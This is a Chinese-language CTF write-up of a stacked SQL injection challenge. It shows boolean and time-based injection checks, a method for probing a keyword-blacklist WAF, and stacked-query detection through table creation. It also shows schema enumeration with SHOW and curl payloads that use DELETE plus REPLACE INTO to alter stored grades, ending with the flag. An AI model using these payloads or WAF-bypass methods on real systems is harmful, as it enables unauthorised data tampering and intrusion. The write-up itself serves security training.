# DASCTF multiSQL — 堆叠注入 + REPLACE INTO 改成绩（WAF 黑名单路由到非 SELECT 写法）

## 核心思路

PHP+MariaDB 成绩查询系统，注入点 POST username。"改成绩过 425 分验证"的目标 + WAF 黑名单禁 SELECT/UNION/UPDATE/INSERT 封死常规读写路线，指向堆叠查询（multiSQL）：堆叠 DELETE 原行 + REPLACE INTO 插入总分恰好 425 的新行，过 verify.php 拿 flag。

## 解题过程（带证据）

1. 指纹：首页"死机英语查询系统"，火华 11+201+212=424，verify.php 拒绝语"就你小子考不到425分是吧" → 改库目标 = 总分 425（擦线，多了会被判异常的风险，恰好及格最稳）。
2. 注入确认：`' AND '1'='1` 返回数据行 / `' AND '1'='2` 空，`#` 注释可用；`' AND SLEEP(3)#` 3.1s 响应（单句时间盲注可用）。
3. WAF 边界探测（把关键词放进字符串字面量 `'kw'='kw'` 探测，不影响 SQL 语义）：
   - 拦（页面输出"同学你在干嘛😡"）：select union update insert updatexml，双写 selselectect 也拦 → 子串匹配式黑名单，无双写绕过空间，大小写均拦。
   - 放行：show columns from create drop delete alter rename replace values into out file dumpfile load_file prepare execute handler case when then else end if null procedure analyse desc truncate where limit order group having sleep benchmark substr ascii mid left right ord hex char concat version database information schema。
4. 堆叠可用性判定（关键坑，见下）：`';SLEEP(3)#` 无延迟不能判死堆叠——改为可观察状态探测：`';CREATE TABLE pwn8601(x INT)#` 执行后，后续 `';SHOW TABLES#` 的结果集被追加渲染到表格里，且 pwn8601 出现 → multi_query 堆叠真实执行，第二语句结果集会被追加显示（这是 MariaDB 场景下的信息泄露主通道）。
5. 枚举（全程避开 SELECT）：`;SHOW DATABASES#` → english/information_schema/mysql/performance_schema；`;SHOW TABLES#` → score（+ 我的测试表）；`;SHOW COLUMNS FROM score#` → username varchar(255) / listen int / `read` int / `write` int（read/write 是保留字，比较需反引号；MariaDB 无 `DESC 表名` 语法，必须 SHOW COLUMNS）。
6. 写库（INSERT/UPDATE 被禁，DELETE/REPLACE 放行）：
   - `';DELETE FROM score WHERE username='火华'#` → boolean 复查原行消失。
   - `';REPLACE INTO score VALUES('火华',141,142,142)#` → 141+142+142=425，boolean 确认 listen=141 落库。
7. `GET /verify.php` → "你小子可以啊，竟然擦边过了" + flag。

## 关键 Payload

```bash
T='http://<target>:80'
# 1) 删原行（INSERT/UPDATE 被禁 → DELETE+REPLACE 组合）
curl -s "$T/index.php" --data-urlencode "username=火华';DELETE FROM score WHERE username='火华'#"
# 2) 插入总分 425 的新行（REPLACE INTO 等价 INSERT OR REPLACE）
curl -s "$T/index.php" --data-urlencode "username=火华';REPLACE INTO score VALUES('火华',141,142,142)#"
# 3) 验证
curl -s "$T/verify.php"
```

WAF 探测模板（关键词放字符串字面量里测黑名单，不触发语法错误）：

```bash
curl -s "$T/index.php" --data-urlencode "username=x' AND 'KEYWORD'='KEYWORD'#"
# 输出"同学你在干嘛😡"=被拦；返回数据行=放行
```

## flag

flag{Ju3t_use_mo2e_t2en_0ne_SQL}

## 复盘教训

- 堆叠注入判定不能用 SLEEP 计时：multi_query 下 PHP 常不读第二语句结果集，延迟根本不会发生；正确姿势是造可观察状态变化（建表/改数据/写文件）再用 SHOW 或布尔复核。
- 黑名单把 SELECT/UNION/UPDATE/INSERT 全禁时，读写替代面：枚举走 SHOW TABLES / SHOW COLUMNS FROM（放行概率高），写库走 REPLACE INTO / DELETE / RENAME / CREATE ... SELECT（若 create 未禁）。
- 时间消耗主因：在"堆叠是否可用"上被 SLEEP 假阴性误导绕了一圈。先用状态变化探测再谈计时。
